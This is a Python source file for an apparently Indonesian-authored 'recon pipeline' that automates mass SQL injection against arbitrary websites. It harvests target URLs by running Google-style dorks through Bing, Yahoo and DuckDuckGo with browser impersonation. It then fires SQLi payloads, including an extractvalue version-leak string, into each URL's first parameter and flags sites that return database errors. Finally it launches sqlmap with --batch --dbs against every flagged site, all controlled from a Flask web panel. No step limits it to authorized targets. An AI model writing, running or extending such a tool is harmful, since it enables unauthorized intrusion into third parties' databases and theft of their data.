#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Recon Pipeline — Project fabz
Final Edition: Fixed Blacklist Logic & Robust Scraper
Credit: fabz
"""

import os
import re
import sys
import time
import random
import shutil
import subprocess
import argparse
import threading
import queue
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote_plus

try:
    import requests
    from bs4 import BeautifulSoup
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("[!] Install dulu: pip install requests beautifulsoup4 flask curl_cffi")
    sys.exit(1)

import urllib3
urllib3.disable_warnings()

# ======================== CONFIG ========================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILES_DIR = os.path.join(BASE_DIR, "files")
HASIL_DIR = os.path.join(BASE_DIR, "hasil")

DORKS_FILE = os.path.join(FILES_DIR, "dorks.txt")
UA_FILE = os.path.join(FILES_DIR, "useragents.txt")

CRAWL_FILE = os.path.join(HASIL_DIR, "urls_crawl.txt")
VULN_FILE = os.path.join(HASIL_DIR, "urls_vuln.txt")
SQLMAP_DIR = os.path.join(HASIL_DIR, "sqlmap_dump")

SQLMAP_PATH = "sqlmap"
USER_AGENTS = []
MAX_RANDOM_DORKS = 30 
DELAY_BETWEEN_DORKS = 5   

ERROR_PATTERNS = [
    r"You have an error in your SQL syntax",
    r"Warning:\s*mysql_fetch",
    r"XPATH syntax error",
    r"SQLSTATE\[",
    r"ORA-\d{5}",
    r"Microsoft OLE DB Provider for SQL Server",
    r"PostgreSQL.*ERROR",
    r"Unclosed quotation mark",
    r"syntax error at or near"
]

# Blacklist cuma buat domain search engine & sosmed biar gak muter di situ
BLACKLIST_DOMAINS = [
    "google.com", "youtube.com", "facebook.com", "instagram.com",
    "twitter.com", "x.com", "linkedin.com", "github.com",
    "microsoft.com", "apple.com", "cloudflare.com", "mozilla.org",
    "wikipedia.org", "pinterest.com", "reddit.com", "amazon.com",
    "netflix.com", "tiktok.com", "whatsapp.com", "telegram.org",
    "bing.com", "yahoo.com", "duckduckgo.com", "w3.org"
]

STOP_EVENT = threading.Event()
LOG_QUEUE = queue.Queue()

def log_realtime(msg):
    LOG_QUEUE.put(msg)

# ======================== HELPER ========================
def load_lines(path):
    if not os.path.exists(path): return []
    with open(path, encoding="utf-8", errors="ignore") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]

def load_useragents():
    ua = load_lines(UA_FILE)
    return ua if ua else ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]

def is_blacklisted(url):
    """Cek apakah domain utama dari URL ini masuk blacklist"""
    try:
        domain = urlparse(url).netloc.lower()
        if domain.startswith("www."):
            domain = domain[4:] # Buang www.
            
        # Cek apakah domain persis sama atau subdomain dari blacklist
        return any(domain == b or domain.endswith("." + b) for b in BLACKLIST_DOMAINS)
    except:
        return True

def inject_param(url, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs: return None
    first_key = list(qs.keys())[0]
    clean_val = re.sub(r"['\"]", "", qs[first_key][0])
    qs[first_key] = [clean_val + payload]
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(qs, doseq=True), parsed.fragment))

def detect_error(text):
    for pat in ERROR_PATTERNS:
        if re.search(pat, text, re.IGNORECASE): return pat
    return None

def find_sqlmap():
    found = shutil.which(SQLMAP_PATH)
    if found: return found
    if os.path.isfile(SQLMAP_PATH): return SQLMAP_PATH
    return None

# ======================== MULTI-ENGINE SCRAPER ========================
def scrape_bing(dork):
    urls = set()
    try:
        r = cffi_requests.get(f"https://www.bing.com/search?q={quote_plus(dork)}&count=30", impersonate="chrome", timeout=15)
        soup = BeautifulSoup(r.text, "html.parser")
        # Cari semua tag <a> di dalam hasil pencarian
        for a in soup.select("li.b_algo h2 a, .b_algo a"):
            href = a.get("href")
            if href and href.startswith("http"):
                # Bersihin URL dari redirect Bing
                if "bing.com/ck/a" in href:
                    parsed = urlparse(href)
                    qs = parse_qs(parsed.query)
                    if "u" in qs:
                        # Decode base64 dari Bing (kadang suka gini)
                        import base64
                        try:
                            real_url = base64.b64decode(qs["u"][0].split("&")[0].replace("a1", "")).decode('utf-8')
                            if not is_blacklisted(real_url):
                                urls.add(real_url)
                        except:
                            pass
                else:
                    if not is_blacklisted(href):
                        urls.add(href)
    except Exception as e:
        pass
    return urls

def scrape_yahoo(dork):
    urls = set()
    try:
        r = cffi_requests.get(f"https://search.yahoo.com/search?p={quote_plus(dork)}", impersonate="chrome", timeout=15)
        soup = BeautifulSoup(r.text, "html.parser")
        # Selector Yahoo
        for a in soup.select("div.algo h3 a, .compTitle a"):
            href = a.get("href")
            if href and href.startswith("http"):
                # Yahoo suka pake redirect 'RU=' di URL-nya
                if "yahoo.com" in href and "RU=" in href:
                    parsed = urlparse(href)
                    qs = parse_qs(parsed.query)
                    if "RU" in qs:
                        real_url = qs["RU"][0]
                        if not is_blacklisted(real_url):
                            urls.add(real_url)
                else:
                    if not is_blacklisted(href):
                        urls.add(href)
    except:
        pass
    return urls

def scrape_ddg(dork):
    urls = set()
    try:
        r = cffi_requests.post("https://html.duckduckgo.com/html/", data={"q": dork}, impersonate="chrome", timeout=15)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.select("a.result__a"):
            href = a.get("href")
            if href and href.startswith("http"):
                # DDG suka pake redirect 'uddg='
                if "duckduckgo.com/l/" in href:
                    parsed = urlparse(href)
                    qs = parse_qs(parsed.query)
                    if "uddg" in qs:
                        real_url = qs["uddg"][0]
                        if not is_blacklisted(real_url):
                            urls.add(real_url)
                else:
                    if not is_blacklisted(href):
                        urls.add(href)
    except:
        pass
    return urls

# ======================== CORE LOGIC ========================
def check_sqli(url):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        base_target = inject_param(url, "")
        if not base_target: return False, "Invalid URL"
        requests.get(base_target, headers=headers, timeout=5, verify=False)

        payloads = ["'", "\"", "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"]
        for p in payloads:
            test_url = inject_param(url, p)
            if not test_url: continue
            try:
                r = requests.get(test_url, headers=headers, timeout=5, verify=False)
                err = detect_error(r.text)
                if err: return True, f"SQLi ({err[:20]})"
            except: pass
    except: pass
    return False, "Safe"

# ======================== GENERATORS ========================
def run_scraper_gen(sample=None):
    STOP_EVENT.clear()
    os.makedirs(HASIL_DIR, exist_ok=True)
    
    log_realtime("\n=== [STAGE 1] RANDOM 30 DORKS (3 Engines) ===")
    
    dorks = load_lines(DORKS_FILE)
    if not dorks:
        log_realtime("[!] files/dorks.txt kosong.")
        yield
        return

    if len(dorks) > MAX_RANDOM_DORKS:
        dorks = random.sample(dorks, MAX_RANDOM_DORKS)
        log_realtime(f"[*] Ngambil {MAX_RANDOM_DORKS} Dork acak dari total {len(load_lines(DORKS_FILE))} dork.")
    else:
        log_realtime(f"[*] Total dork {len(dorks)} (kurang dari 30), pake semua.")

    all_urls = set()

    for i, dork in enumerate(dorks, 1):
        if STOP_EVENT.is_set(): break
        log_realtime(f"[{i}/{len(dorks)}] Dorking: {dork[:40]}...")
        
        # Coba Bing
        found_urls = scrape_bing(dork)
        engine_used = "Bing"
        
        if not found_urls:
            found_urls = scrape_yahoo(dork)
            engine_used = "Yahoo"
            
        if not found_urls:
            found_urls = scrape_ddg(dork)
            engine_used = "DDG"
            
        if found_urls:
            log_realtime(f"    -> Dapet {len(found_urls)} URL (via {engine_used}).")
            all_urls.update(found_urls)
        else:
            log_realtime(f"    -> 0 URL (Blocked/Safe)")
            
        time.sleep(DELAY_BETWEEN_DORKS) 

    if all_urls:
        with open(CRAWL_FILE, "a") as f:
            for u in all_urls: f.write(u + "\n")
        log_realtime(f"[+] Total {len(all_urls)} URL disimpan ke {CRAWL_FILE}")
    yield

def run_checker_gen():
    STOP_EVENT.clear()
    log_realtime("\n=== [STAGE 2] VALIDATION (SQLi) ===")
    if not os.path.exists(CRAWL_FILE): return

    urls = list(set([u.strip() for u in open(CRAWL_FILE) if u.strip()]))
    log_realtime(f"[*] Ngecek {len(urls)} URL...")
    
    vuln = set()
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_sqli, url): url for url in urls}
            
            for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
                if STOP_EVENT.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                url = futures[future]
                try:
                    is_vuln, reason = future.result()
                except Exception:
                    is_vuln, reason = False, "Error Connection"
                
                if is_vuln:
                    log_realtime(f"[{i}/{len(urls)}] [VULN] {url} ({reason})")
                    vuln.add(url)
                else:
                    log_realtime(f"[{i}/{len(urls)}] [SAFE] {url} ({reason})")
                    
                yield 
    finally:
        if vuln:
            with open(VULN_FILE, "a") as f:
                for u in vuln: f.write(u + "\n")
            log_realtime(f"\n[+] {len(vuln)} URL rentan disimpan ke {VULN_FILE}")
        else:
            log_realtime("\n[*] Gak ada URL rentan yang ditemukan.")
        yield

def run_sqlmap_gen():
    STOP_EVENT.clear()
    log_realtime("\n=== [STAGE 3] SQLMAP ===")
    if not os.path.exists(VULN_FILE): return
    
    urls = list(set([u.strip() for u in open(VULN_FILE) if u.strip()]))
    if not urls: return

    try:
        for i, url in enumerate(urls, 1):
            if STOP_EVENT.is_set(): break
            
            safe_name = re.sub(r'[\\/*?:"<>|]', "_", url)
            safe_name = safe_name.replace("http://", "").replace("https://", "")[:50]
            out = os.path.join(SQLMAP_DIR, safe_name)
            
            log_realtime(f"[{i}/{len(urls)}] SQLmap: {url}")
            cmd = [find_sqlmap(), "-u", url, "--batch", "--dbs", "--output-dir", out]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in proc.stdout:
                if STOP_EVENT.is_set():
                    proc.kill()
                    break
                log_realtime(f"  {line.strip()}")
            proc.wait()
            yield
    finally:
        log_realtime(f"\n[+] Selesai.")
        yield

# ======================== FLASK WEB ========================
def create_app():
    from flask import Flask, render_template, Response, request, jsonify
    app = Flask(__name__, template_folder="templates", static_folder="static")

    @app.route("/")
    def index(): return render_template("index.html")

    @app.route("/stop", methods=["POST"])
    def stop():
        STOP_EVENT.set()
        return {"status": "stopped"}
        
    @app.route("/clear_results", methods=["POST"])
    def clear_results():
        try:
            if os.path.exists(CRAWL_FILE): os.remove(CRAWL_FILE)
            if os.path.exists(VULN_FILE): os.remove(VULN_FILE)
            if os.path.exists(SQLMAP_DIR): shutil.rmtree(SQLMAP_DIR)
            return jsonify({"status": "success", "message": "Semua hasil di folder /hasil berhasil dihapus!"})
        except Exception as e:
            return jsonify({"status": "error", "message": f"Gagal menghapus: {e}"})

    @app.route("/get_results/<type>")
    def get_results(type):
        path = CRAWL_FILE if type == "crawl" else VULN_FILE if type == "vuln" else ""
        if type == "sqlmap" and os.path.exists(SQLMAP_DIR):
            return "\n".join([f for f in os.listdir(SQLMAP_DIR) if os.path.isdir(os.path.join(SQLMAP_DIR, f))])
        if path and os.path.exists(path): return open(path).read()
        return ""

    @app.route("/stream/<mode>")
    def stream(mode):
        def generate():
            while not LOG_QUEUE.empty(): LOG_QUEUE.get()
            try:
                if mode == "dork": gen = run_scraper_gen()
                elif mode == "check": gen = run_checker_gen()
                elif mode == "sqlmap": gen = run_sqlmap_gen()
                elif mode == "full":
                    def full_gen():
                        yield from run_scraper_gen()
                        if STOP_EVENT.is_set(): return
                        yield from run_checker_gen()
                        if STOP_EVENT.is_set(): return
                        yield from run_sqlmap_gen()
                    gen = full_gen()
                
                def run_gen():
                    for _ in gen: pass
                threading.Thread(target=run_gen, daemon=True).start()

                while True:
                    if STOP_EVENT.is_set(): break
                    try:
                        msg = LOG_QUEUE.get(timeout=0.1)
                        yield f"data: {msg}\n\n"
                    except queue.Empty:
                        continue

            except GeneratorExit:
                STOP_EVENT.set()
            finally:
                if not STOP_EVENT.is_set():
                    yield "data: [DONE]\n\n"

        res = Response(generate(), mimetype="text/event-stream")
        res.headers['Cache-Control'] = 'no-cache'
        res.headers['X-Accel-Buffering'] = 'no'
        return res

    return app

# ======================== MAIN ========================
def main():
    global USER_AGENTS
    USER_AGENTS = load_useragents()
    parser = argparse.ArgumentParser()
    parser.add_argument("--web", action="store_true")
    args = parser.parse_args()

    if args.web:
        app = create_app()
        print("\n" + "="*50)
        print(" [!] RECON PIPELINE - BETA VERSION [!]")
        print("="*50)
        print(f" Mode Aman: Ambil {MAX_RANDOM_DORKS} Dork acak per sesi.")
        print("="*50 + "\n")
        print(f"[+] Web Mode aktif di http://127.0.0.1:5000")
        app.run(host="127.0.0.1", port=5000, debug=False, threaded=True)
    else:
        print("Gunakan --web")

if __name__ == "__main__":
    main()